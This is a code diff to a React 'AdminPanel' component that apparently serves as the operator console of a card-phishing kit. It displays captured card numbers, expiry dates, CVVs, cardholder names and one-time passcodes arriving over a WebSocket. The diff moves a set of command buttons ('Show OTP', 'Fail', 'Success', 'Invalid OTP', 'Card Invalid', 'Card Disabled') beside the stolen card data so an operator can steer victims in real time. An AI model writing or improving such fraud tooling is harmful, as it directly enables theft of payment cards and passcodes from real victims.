@@ -27,6 +27,7 @@ const AdminPanel = () => {
   const [otp, setOtp] = useState<string>('');
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [ws, setWs] = useState<WebSocket | null>(null);
+  const [showCommands, setShowCommands] = useState(false);
 
   useEffect(() => {
     // Create WebSocket server connection
@@ -42,6 +43,7 @@ const AdminPanel = () => {
       if (data.type === 'cardData') {
         setCardData(data.data);
         setUserInfo(data.userInfo);
+        setShowCommands(true); // Show commands when new card data arrives
         
         // Add new visitor
         const newVisitor = {
@@ -105,58 +107,57 @@ const AdminPanel = () => {
         </div>
       )}
 
-      {/* Card Data Section */}
+      {/* Card Data Section with Commands */}
       {cardData && (
         <div className="bg-gray-800 p-4 rounded mb-6">
           <h2 className="text-xl font-bold mb-4">Card Information</h2>
-          <div className="font-bold text-lg">
-            {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | {otp && `OTP: ${otp}`}
+          <div className="font-bold text-lg flex items-center justify-between">
+            <span>
+              {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | {otp && `OTP: ${otp}`}
+            </span>
+            {showCommands && (
+              <div className="flex space-x-2 ml-4">
+                <button
+                  onClick={() => sendCommand('showotp')}
+                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Show OTP
+                </button>
+                <button
+                  onClick={() => sendCommand('fail')}
+                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Fail
+                </button>
+                <button
+                  onClick={() => sendCommand('success')}
+                  className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Success
+                </button>
+                <button
+                  onClick={() => sendCommand('invalidotp')}
+                  className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Invalid OTP
+                </button>
+                <button
+                  onClick={() => sendCommand('cardinvalid')}
+                  className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Card Invalid
+                </button>
+                <button
+                  onClick={() => sendCommand('carddisabled')}
+                  className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
+                >
+                  Card Disabled
+                </button>
+              </div>
+            )}
           </div>
         </div>
       )}
-
-      {/* Command Buttons */}
-      <div className="bg-gray-800 p-4 rounded">
-        <h2 className="text-xl font-bold mb-4">Commands</h2>
-        <div className="grid grid-cols-3 gap-4">
-          <button
-            onClick={() => sendCommand('showotp')}
-            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Show OTP
-          </button>
-          <button
-            onClick={() => sendCommand('fail')}
-            className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Fail
-          </button>
-          <button
-            onClick={() => sendCommand('success')}
-            className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Success
-          </button>
-          <button
-            onClick={() => sendCommand('invalidotp')}
-            className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Invalid OTP
-          </button>
-          <button
-            onClick={() => sendCommand('cardinvalid')}
-            className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Card Invalid
-          </button>
-          <button
-            onClick={() => sendCommand('carddisabled')}
-            className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-4 rounded"
-          >
-            Card Disabled
-          </button>
-        </div>
-      </div>
     </div>
   );
 };
